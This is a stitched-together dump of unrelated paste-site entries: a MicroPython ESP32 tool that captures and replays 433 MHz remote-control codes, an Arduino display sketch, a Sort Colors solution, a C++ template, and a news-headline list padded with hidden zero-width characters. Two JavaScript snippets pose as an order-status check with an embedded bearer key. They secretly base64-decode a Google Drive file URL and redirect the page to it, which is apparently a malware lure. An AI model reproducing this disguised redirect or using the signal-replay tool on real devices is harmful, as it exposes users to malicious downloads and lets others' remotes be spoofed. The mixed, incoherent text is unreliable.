# sprawdź czy wartość mieści się w tolerancji procentowej +/-
@micropython.native
def tolerancja(poprz, akt, ile_procent):
    return abs(poprz - akt) <= poprz * (ile_procent / 100)

""""""
# prosty filtr
@micropython.native
def filtr(pin, max_probek = 5, czas_sygn_min = 1000, czas_sygn_max = 30000, procent_delta = 0.8, procent_czas = 0.8):
    licz = delta_poprz = start_poprz = 0; stan = pin.value()
    while licz < max_probek:
        czas_teraz = time.ticks_us()
        while pin.value() == stan:
            pass
        delta_teraz = time.ticks_diff(time.ticks_us(), czas_teraz)
        stan = pin.value()
        if stan == 1 and czas_sygn_min < delta_teraz < czas_sygn_max: # jeżeli stan == 1, to wcześniej było 0
            licz = (licz + 1) if (tolerancja(delta_poprz, delta_teraz, procent_delta) and tolerancja(start_poprz, czas_teraz, procent_czas)) else 0
            delta_poprz, start_poprz = delta_teraz, czas_teraz
        elif delta_teraz > czas_sygn_max: # wyjscie odbiornika milknie na dłuższą chwilę, sygnał został odebrany
            break
    print(""\n> zwrot: %s <\n"" % (licz == max_probek))
    return licz == max_probek # jeżeli licznik osiągnął max_próbek, wtedy zwracam True, inaczej False
    """"""

# prosty filtr
@micropython.native
def filtr(pin, max_probek = 6, czas_sygn_min = 1500, czas_sygn_max = 30000, procent_delta = 0.8, procent_czas = 0.8):
    licz = delta_poprz = start_poprz = 0; stan = pin.value()
    while licz < max_probek:
        czas_teraz = time.ticks_us()
        while pin.value() == stan:
            pass
        delta_teraz = time.ticks_diff(time.ticks_us(), czas_teraz)
        stan = pin.value()
        if stan == 1 and czas_sygn_min < delta_teraz < czas_sygn_max: # jeżeli stan == 1, to wcześniej było 0
            licz = (licz + 1) if (tolerancja(delta_poprz, delta_teraz, procent_delta) and tolerancja(start_poprz, czas_teraz, procent_czas)) else 0
            delta_poprz, start_poprz = delta_teraz, czas_teraz
        elif delta_teraz > czas_sygn_max: # wyjscie odbiornika milknie na dłuższą chwilę, sygnał został odebrany
            break
    #print(""\n> zwrot: %s <\n"" % (licz == max_probek))
    return licz == max_probek # jeżeli licznik osiągnął max_próbek, wtedy zwracam True, inaczej False

# odbiór sygnałów
@micropython.native
def sygnaly(pin, max_buff = 1000, czas_sygn_max = 30000):
    buff = []; czas_delta = 0
    pierwszy_stan = stan = pin.value()
    while czas_delta < czas_sygn_max and max_buff > 0:
        czas_teraz = time.ticks_us()
        while pin.value() == stan:
            pass
        czas_delta = time.ticks_diff(time.ticks_us(), czas_teraz)
        stan = pin.value()
        buff.append(czas_delta)
        max_buff -= 1
    return (None if max_buff != 0 else (buff, bool(pierwszy_stan)))

# wysyłanie, moduł RMT z biblioteki esp32

def nadajnik(pin, sygnaly, powtorz = 10):
    # pierwsza odebrana ramka zazwyczaj jest niepełna, stąd ""powtorz + 1"" czyli domyślnie +1 ramka więcej
    pin.write_pulses(sygnaly[0] * (powtorz + 1), sygnaly[1]) 
    while not pin.wait_done():
        time.sleep_ms(100)
    
def cpu_boost(boost):
    if boost:
        machine.freq(240000000)
        print(""[CPU]: 240 MHz"")
    else:
        machine.freq(160000000)
        print(""[CPU]: 160 MHz"")
        
def wyswietl_tekst(oled, tekst, spij_ms = 0, odstep_x = 0, odstep_y = 12):
    oled.fill(0)
    t = tekst.split(""\n"")
    odst_y = 0
    for i in t:
        oled.text(i, odstep_x, odst_y, 1)
        odst_y += odstep_y
    oled.show()
    time.sleep_ms(spij_ms)
    
def przycisk_pauza(p):
    while p.value() != 1:
        time.sleep_ms(10)
    
# funkcja główna - wysyła otrzymany bufor sygnałów
# odbiornik: superheterodyna 433 Mhz: ""RX500"" i ""RXB6 v2.0"" (w obu szum na wyjściu)
# nadajnik: SYN115
# anteny: drut 173 mm
if __name__ == ""__main__"":
    #cpu_boost(True)
    pin_odbiornik = machine.Pin(21, machine.Pin.IN)
    pin_nadajnik = esp32.RMT(0, pin = machine.Pin(23, machine.Pin.OUT), clock_div = 80, idle_level = False)
    
    przycisk_a = machine.Pin(26, machine.Pin.IN)
    przycisk_b = machine.Pin(27, machine.Pin.IN)
    
    i2c = machine.I2C(1, scl = machine.Pin(32), sda = machine.Pin(33))
    oled = ssd1306.SSD1306_I2C(128, 64, i2c)
    oled.contrast(10)
    
    wyswietl_tekst(oled, ""= Pilot v0.1 ="", spij_ms = 2000)
    wyswietl_tekst(oled, ""Ekran I2C: %s\nSys: %s\nuPy: %s"" %
                   (i2c.scan(), sys.platform, ""."".join(map(str, sys.implementation[1]))[:-1]), spij_ms = 5000)
    
    #print(""\n[SKAN]: Naciśnij i przytrzymaj przycisk pilota ..."", end = """")
    wyswietl_tekst(oled, ""[SKAN]:\n\nNacisnij\nprzycisk\npilota ..."")
    while True:
        gc.collect() # zbieram śmieci
        if filtr(pin_odbiornik):
            ret = sygnaly(pin_odbiornik)
            if ret != None:
                sig = signals(ret).return_unique_signals()
                if len(sig) > 0:
                    #print(""\n[INFO]:\tWykrytych kodów:"", len(sig))
                    wyswietl_tekst(oled, ""[INFO]:\n\nWykrytych kodow:\n=> %i"" % len(sig), 5000)
                    for i in sig:
                        #input('\n[TEST]:\tPrzetestuj kod numer: [%i/%i] => naciśnij przeciwny przycisk, następnie ""Enter"" na klawiaturze ... ' % ((i + 1), len(sig)))
                        #print(sig[i])
                        wyswietl_tekst(oled, '[TEST]:\n\nKod nr: %i/%i\n\nNacisnij (A)' % ((i + 1), len(sig)))
                        przycisk_pauza(przycisk_a)
                        nadajnik(pin_nadajnik, (sig[i], False))
                        #print(""[INFO]:\tWysłano kod numer: %i"" % (i + 1))
                        wyswietl_tekst(oled, ""[INFO]:\n\nWyslano kod nr:\n=> %i"" % (i + 1), spij_ms = 2000)
                        
                else:
                    #print(""[BŁĄD]: Nie znaleziono poprawnych sygnalow"")
                    wyswietl_tekst(oled, ""[BLAD]:\n\nBrak kodow"", spij_ms = 2000)
                #print(""\n[SKAN]: Naciśnij i przytrzymaj przycisk pilota ..."", end = """")
                wyswietl_tekst(oled, ""[SKAN]:\n\nNacisnij\nprzycisk\npilota ..."")
                "
js0aPPSa,**Random Speed** rev_01,pleasedontcode,Arduino,Saturday 19th of April 2025 04:47:54 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Random Speed**
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-04-19 21:46:14

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Utilize the Adafruit_GFX library to create a */
	/* dynamic graphical display that updates based on */
	/* user input, enhancing interactivity and visual */
	/* feedback in the project. */
/****** SYSTEM REQUIREMENT 2 *****/
	/* Utilize the Adafruit_GFX library to develop an */
	/* interactive graphical display that responds to */
	/* user inputs, providing real-time visual feedback */
	/* and enhancing user experience with dynamic content */
	/* updates. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <Adafruit_GFX.h>	//https://github.com/adafruit/Adafruit-GFX-Library
#include <Adafruit_TFTLCD.h> // Include the TFT LCD library (assumed needed for tft instance)

// Define the pins for the TFT LCD  
#define TFT_CS     10  
#define TFT_RST    9  
#define TFT_DC     8

// Create an instance of the TFT LCD  
Adafruit_TFTLCD tft(TFT_CS, TFT_DC, TFT_RST); // Create an instance of the TFT LCD

// Speed variable  
int speed = 0; // Speed in km/h (initialized to 0)

// Function to display speed on the TFT
void displaySpeed(int speed) {
    // Clear the previous speed display  
    tft.fillRect(0, 0, 240, 40); // Clear the area for speed display

    // Display the speed  
    tft.setCursor(10, 10);
    tft.print(""Speed: "");
    tft.print(speed);
    tft.print("" km/h"");
}

void setup(void)
{
    // put your setup code here, to run once:
    tft.begin(); // Initialize the TFT  
    tft.setRotation(1); // Set the rotation of the screen  
    tft.fillScreen(WHITE); // Fill the screen with white

    // Set text properties  
    tft.setTextColor(BLACK);
    tft.setTextSize(3);
}

void loop(void)
{
    // put your main code here, to run repeatedly:
    // Simulate speed changes (for testing purposes)
    speed = random(0, 200); // Random speed between 0 and 200 km/h

    // Call function to display the updated speed
    displaySpeed(speed);

    delay(1000); // Update every second  
}

/* END CODE */"
8F4uzhsF,Market.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 04:45:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10914/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M8vfLbkm,Untitled,Epiphemeral,JavaScript,Saturday 19th of April 2025 04:30:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81752/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WDnbck5x,Sort colors (dutch national flag problem),smj007,Python,Saturday 19th of April 2025 04:29:59 PM CDT,"""""""
Bucket sort: TC is O(n). 
There's this case nums[curr]==2, after swapping with right, we should not increase i since the number swapped back from p2 can be 0/1, which needs to be further processed

When curr pointer has passed left pointer, the number swapped from left can only be
1 as curr pointer has passeed left.

Both of them are tricky to understadn
""""""

class Solution:
    def sortColors(self, nums: List[int]) -> None:
        """"""
        Do not return anything, modify nums in-place instead.
        """"""

        left = 0
        right = len(nums)-1
        i = 0

        while i <= right:
            if nums[i] == 0:
                nums[i], nums[left] = nums[left], nums[i]
                left += 1
            elif nums[i] == 2:
                nums[i], nums[right] = nums[right], nums[i]
                right -= 1
                i -= 1
            i += 1

        "
Y6n3X05Z,C++ Template,Vince14,C++,Saturday 19th of April 2025 03:36:48 PM CDT,"#include <iostream>
#include <string>
#include <cstring>
#include <algorithm>
#include <cmath>
#include <regex>
#include <vector>
#include <set>
#include <map>
#include <stack>
#include <queue>
#include <deque>
#include <unordered_map>
#include <numeric>
#include <iomanip>
using namespace std;
#define pii pair<int, int>
#define ll long long
#define FAST ios_base::sync_with_stdio(false); cin.tie(NULL)
#define mp(x1, x2) ( make_pair(x1, x2) )
const int dx[4] = {1, 0, 0, -1}, dy[4] = {0, 1, -1, 0};
const int dl[2] = {1, -1};
const int MOD = 100000007;
const int MAXN = 202020;

int main(){
    FAST;
    freopen(""combo.in"", ""r"", stdin);
    freopen(""combo.out"", ""w"", stdout);
}
"
8ShXPfnw,News April19 25,Newscaster_Ned,Email,Saturday 19th of April 2025 03:21:57 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

T‎i‎m‎e‎ ‎f‎o‎r‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎u‎p‎d‎a‎t‎e‎ ‎o‎n‎ ‎t‎h‎o‎s‎e‎ ‎m‎o‎n‎k‎e‎y‎s‎.‎

A‎l‎l‎e‎g‎e‎d‎ ‎T‎r‎e‎n‎ ‎d‎e‎ ‎A‎r‎a‎g‎u‎a‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎ ‎B‎r‎e‎a‎k‎s‎ ‎D‎o‎w‎n‎ ‎L‎i‎k‎e‎ ‎a‎ ‎B‎i‎g‎ ‎B‎a‎b‎y‎ ‎A‎f‎t‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎
P‎o‎l‎i‎c‎e‎:‎ ‎M‎a‎n‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎R‎a‎p‎i‎n‎g‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎W‎o‎m‎a‎n‎ ‎H‎e‎ ‎M‎e‎t‎ ‎o‎n‎ ‎D‎a‎t‎i‎n‎g‎ ‎A‎p‎p‎
M‎e‎l‎a‎n‎i‎a‎ ‎T‎r‎u‎m‎p‎ ‎U‎n‎v‎e‎i‎l‎s‎ ‎F‎e‎s‎t‎i‎v‎i‎t‎i‎e‎s‎ ‎f‎o‎r‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎E‎a‎s‎t‎e‎r‎ ‎E‎g‎g‎ ‎R‎o‎l‎l‎
N‎B‎C‎'‎s‎ ‎'‎L‎a‎w‎ ‎&‎ ‎O‎r‎d‎e‎r‎'‎ ‎P‎o‎r‎t‎r‎a‎y‎s‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎a‎s‎ ‎I‎n‎n‎o‎c‎e‎n‎t‎ ‎a‎n‎d‎ ‎C‎o‎p‎s‎ ‎a‎s‎ ‎R‎a‎p‎i‎s‎t‎s‎
J‎e‎f‎f‎r‎e‎y‎ ‎G‎o‎l‎d‎b‎e‎r‎g‎:‎ ‎R‎e‎a‎c‎t‎i‎o‎n‎ ‎t‎o‎ ‎S‎h‎a‎p‎i‎r‎o‎ ‎A‎t‎t‎a‎c‎k‎ ‎b‎y‎ ‎'‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎'‎ ‎P‎e‎r‎p‎ ‎'‎M‎u‎t‎e‎d‎'‎
V‎e‎l‎s‎h‎i‎:‎ ‎U‎.‎S‎.‎ ‎S‎t‎r‎i‎k‎i‎n‎g‎ ‎H‎o‎u‎t‎h‎i‎s‎,‎ ‎W‎h‎o‎ ‎H‎a‎v‎e‎n‎'‎t‎ ‎C‎l‎a‎i‎m‎e‎d‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎R‎e‎c‎e‎n‎t‎l‎y‎
N‎Y‎T‎'‎s‎ ‎B‎a‎k‎e‎r‎:‎ ‎L‎e‎f‎t‎y‎ ‎V‎i‎o‎l‎e‎n‎c‎e‎ ‎E‎x‎i‎s‎t‎s‎,‎ ‎T‎r‎u‎m‎p‎ ‎M‎o‎r‎e‎ ‎O‎k‎a‎y‎ ‎w‎i‎t‎h‎ ‎D‎a‎n‎g‎e‎r‎o‎u‎s‎ ‎R‎h‎e‎t‎o‎r‎i‎c‎
B‎r‎o‎o‎k‎l‎y‎n‎ ‎T‎e‎s‎l‎a‎ ‎V‎a‎n‎d‎a‎l‎i‎s‎m‎ ‎S‎u‎s‎p‎e‎c‎t‎ ‎I‎s‎ ‎a‎ ‎L‎i‎c‎e‎n‎s‎e‎d‎ ‎M‎e‎n‎t‎a‎l‎ ‎H‎e‎a‎l‎t‎h‎ ‎T‎h‎e‎r‎a‎p‎i‎s‎t‎
B‎o‎s‎t‎o‎n‎ ‎C‎e‎l‎e‎b‎r‎a‎t‎e‎s‎ ‎2‎5‎0‎t‎h‎ ‎A‎n‎n‎i‎v‎e‎r‎s‎a‎r‎y‎ ‎o‎f‎ ‎P‎a‎u‎l‎ ‎R‎e‎v‎e‎r‎e‎'‎s‎ ‎R‎i‎d‎e‎ ‎w‎i‎t‎h‎ ‎W‎a‎r‎n‎i‎n‎g‎
'‎S‎h‎a‎m‎e‎ ‎o‎n‎ ‎Y‎o‎u‎'‎:‎ ‎K‎y‎r‎e‎n‎ ‎L‎a‎c‎y‎'‎s‎ ‎A‎g‎e‎n‎t‎ ‎B‎l‎a‎s‎t‎s‎ ‎N‎F‎L‎ ‎f‎o‎r‎ ‎R‎e‎v‎o‎k‎i‎n‎g‎ ‎C‎o‎m‎b‎i‎n‎e‎ ‎I‎n‎v‎i‎t‎e‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
S‎u‎p‎r‎e‎m‎e‎ ‎B‎e‎t‎r‎a‎y‎a‎l‎

S‎C‎O‎T‎U‎S‎ ‎B‎l‎o‎c‎k‎s‎,‎ ‎f‎o‎r‎ ‎N‎o‎w‎,‎ ‎N‎e‎w‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎U‎n‎d‎e‎r‎ ‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎ ‎A‎c‎t‎
S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎C‎h‎i‎e‎f‎ ‎J‎u‎s‎t‎i‎c‎e‎ ‎J‎o‎h‎n‎ ‎R‎o‎b‎e‎r‎t‎s‎,‎ ‎l‎e‎f‎t‎,‎ ‎a‎n‎d‎ ‎a‎s‎s‎o‎c‎i‎a‎t‎e‎ ‎j‎u‎s‎t‎i‎c‎e‎s‎,‎ ‎a‎r‎r‎i‎v‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎H‎o‎u‎s‎
T‎h‎e‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎o‎n‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎b‎l‎o‎c‎k‎e‎d‎,‎ ‎f‎o‎r‎ ‎n‎o‎w‎,‎ ‎t‎h‎e‎ ‎d‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎V‎e‎n‎e‎z‎u‎e‎l‎a‎n‎s‎ ‎h‎e‎l‎d‎ ‎i‎n‎ ‎n‎o‎r‎t‎h‎e‎r‎n‎ ‎T‎e‎x‎a‎s‎ ‎u‎n‎d‎e‎r‎ ‎a‎n‎ ‎1‎8‎t‎h‎ ‎c‎e‎n‎t‎u‎r‎y‎ ‎w‎a‎r‎t‎i‎m‎e‎ ‎l‎a‎w‎.‎

T‎r‎u‎m‎p‎ ‎P‎o‎s‎t‎s‎ ‎P‎h‎o‎t‎o‎ ‎o‎f‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎’‎s‎ ‎K‎n‎u‎c‎k‎l‎e‎ ‎T‎a‎t‎t‎o‎o‎s‎ ‎A‎m‎i‎d‎ ‎M‎S‎-‎1‎3‎ ‎C‎h‎a‎r‎g‎e‎s‎
T‎r‎u‎m‎p‎ ‎P‎o‎s‎t‎s‎ ‎P‎h‎o‎t‎o‎ ‎o‎f‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎'‎s‎ ‎K‎n‎u‎c‎k‎l‎e‎ ‎T‎a‎t‎t‎o‎o‎s‎ ‎A‎m‎i‎d‎ ‎M‎S‎-‎1‎3‎ ‎C‎h‎a‎r‎g‎e‎s‎
7‎,‎5‎8‎1‎
D‎a‎v‎i‎d‎ ‎H‎o‎g‎g‎:‎ ‎T‎h‎e‎ ‎T‎i‎m‎e‎ ‎f‎o‎r‎ ‎J‎a‎m‎e‎s‎ ‎C‎a‎r‎v‎i‎l‎l‎e‎’‎s‎ ‎‘‎T‎i‎m‎i‎d‎’‎ ‎P‎o‎l‎i‎t‎i‎c‎s‎ ‎I‎s‎ ‎O‎v‎e‎r‎
D‎a‎v‎i‎d‎ ‎H‎o‎g‎g‎:‎ ‎T‎h‎e‎ ‎T‎i‎m‎e‎ ‎f‎o‎r‎ ‎J‎a‎m‎e‎s‎ ‎C‎a‎r‎v‎i‎l‎l‎e‎'‎s‎ ‎'‎T‎i‎m‎i‎d‎'‎ ‎P‎o‎l‎i‎t‎i‎c‎s‎ ‎I‎s‎ ‎O‎v‎e‎r‎
8‎4‎8‎
S‎p‎u‎r‎s‎’‎ ‎G‎r‎e‎g‎g‎ ‎P‎o‎p‎o‎v‎i‎c‎h‎ ‎T‎a‎k‎e‎n‎ ‎A‎w‎a‎y‎ ‎i‎n‎ ‎A‎m‎b‎u‎l‎a‎n‎c‎e‎ ‎A‎f‎t‎e‎r‎ ‎F‎a‎i‎n‎t‎i‎n‎g‎ ‎a‎t‎ ‎R‎e‎s‎t‎a‎u‎r‎a‎n‎t‎
S‎p‎u‎r‎s‎'‎ ‎G‎r‎e‎g‎g‎ ‎P‎o‎p‎o‎v‎i‎c‎h‎ ‎T‎a‎k‎e‎n‎ ‎A‎w‎a‎y‎ ‎i‎n‎ ‎A‎m‎b‎u‎l‎a‎n‎c‎e‎ ‎A‎f‎t‎e‎r‎ ‎F‎a‎i‎n‎t‎i‎n‎g‎ ‎a‎t‎ ‎R‎e‎s‎t‎a‎u‎r‎a‎n‎t‎
8‎0‎
P‎o‎l‎l‎:‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎S‎a‎y‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎S‎h‎o‎u‎l‎d‎ ‎N‎o‎t‎ ‎I‎m‎m‎e‎d‎i‎a‎t‎e‎l‎y‎ ‎R‎e‎s‎i‎s‎t‎ ‎T‎r‎u‎m‎p‎ ‎A‎g‎e‎n‎d‎a‎
P‎o‎l‎l‎:‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎S‎a‎y‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎S‎h‎o‎u‎l‎d‎ ‎N‎o‎t‎ ‎I‎m‎m‎e‎d‎i‎a‎t‎e‎l‎y‎ ‎R‎e‎s‎i‎s‎t‎ ‎T‎r‎u‎m‎p‎ ‎A‎g‎e‎n‎d‎a‎
1‎0‎7‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎S‎h‎r‎i‎ ‎T‎h‎a‎n‎e‎d‎a‎r‎ ‎C‎a‎l‎l‎s‎ ‎t‎o‎ ‎I‎m‎p‎e‎a‎c‎h‎ ‎T‎r‎u‎m‎p‎ ‎f‎o‎r‎ ‎S‎e‎n‎d‎i‎n‎g‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎a‎n‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎I‎m‎m‎i‎g‎r‎a‎n‎t‎ ‎t‎o‎ ‎P‎r‎i‎s‎o‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎C‎a‎l‎l‎s‎ ‎t‎o‎ ‎I‎m‎p‎e‎a‎c‎h‎ ‎T‎r‎u‎m‎p‎ ‎F‎o‎r‎ ‎D‎e‎p‎o‎r‎t‎i‎n‎g‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎a‎n‎ ‎t‎o‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎
3‎,‎9‎9‎4‎
T‎r‎u‎m‎p‎ ‎W‎i‎l‎l‎ ‎W‎a‎l‎k‎ ‎A‎w‎a‎y‎ ‎F‎r‎o‎m‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎T‎a‎l‎k‎s‎ ‎i‎n‎ ‎D‎a‎y‎s‎ ‎i‎f‎ ‎M‎o‎s‎c‎o‎w‎ ‎a‎n‎d‎ ‎K‎y‎i‎v‎ ‎A‎r‎e‎n‎’‎t‎ ‎S‎e‎r‎i‎o‎u‎s‎ ‎A‎b‎o‎u‎t‎ ‎P‎e‎a‎c‎e‎
T‎r‎u‎m‎p‎ ‎W‎i‎l‎l‎ ‎W‎a‎l‎k‎ ‎F‎r‎o‎m‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎T‎a‎l‎k‎s‎ ‎i‎n‎ ‎D‎a‎y‎s‎ ‎i‎f‎ ‎n‎o‎ ‎P‎r‎o‎g‎r‎e‎s‎s‎ ‎W‎a‎r‎n‎s‎ ‎R‎u‎b‎i‎o‎
6‎,‎1‎5‎8‎
J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎f‎r‎o‎m‎ ‎D‎e‎p‎o‎r‎t‎i‎n‎g‎ ‎t‎o‎ ‎3‎r‎d‎ ‎C‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎W‎i‎t‎h‎o‎u‎t‎ ‎D‎u‎e‎ ‎P‎r‎o‎c‎e‎s‎s‎
J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎ ‎D‎e‎p‎o‎r‎t‎i‎n‎g‎ ‎t‎o‎ ‎3‎r‎d‎ ‎C‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎W‎i‎t‎h‎o‎u‎t‎ ‎D‎u‎e‎ ‎P‎r‎o‎c‎e‎s‎s‎
9‎7‎1‎
H‎i‎l‎l‎a‎r‎y‎ ‎C‎l‎i‎n‎t‎o‎n‎:‎ ‎‘‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎o‎f‎ ‎C‎o‎n‎s‎c‎i‎e‎n‎c‎e‎ ‎M‎u‎s‎t‎ ‎S‎t‎a‎n‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎’‎ ‎T‎r‎u‎m‎p‎ ‎D‎e‎p‎o‎r‎t‎i‎n‎g‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎
H‎i‎l‎l‎a‎r‎y‎ ‎C‎l‎i‎n‎t‎o‎n‎ ‎T‎h‎r‎o‎w‎s‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎B‎e‎h‎i‎n‎d‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎M‎S‎-‎1‎3‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎
4‎,‎2‎5‎4‎
P‎o‎l‎l‎:‎ ‎M‎o‎s‎t‎ ‎V‎o‎t‎e‎r‎s‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎M‎o‎d‎e‎r‎a‎t‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎O‎v‎e‎r‎ ‎R‎a‎d‎i‎c‎a‎l‎ ‎A‎O‎C‎ ‎a‎n‎d‎ ‎B‎e‎r‎n‎i‎e‎ ‎S‎a‎n‎d‎e‎r‎s‎
P‎o‎l‎l‎:‎ ‎M‎o‎s‎t‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎M‎o‎d‎e‎r‎a‎t‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎O‎v‎e‎r‎ ‎R‎a‎d‎i‎c‎a‎l‎ ‎A‎O‎C‎ ‎a‎n‎d‎ ‎B‎e‎r‎n‎i‎e‎ ‎S‎a‎n‎d‎e‎r‎s‎
1‎0‎6‎
S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎b‎l‎o‎c‎k‎s‎,‎ ‎f‎o‎r‎ ‎n‎o‎w‎,‎ ‎n‎e‎w‎ ‎d‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎u‎n‎d‎e‎r‎ ‎1‎8‎t‎h‎ ‎c‎e‎n‎t‎u‎r‎y‎ ‎w‎a‎r‎t‎i‎m‎e‎ ‎l‎a‎w‎
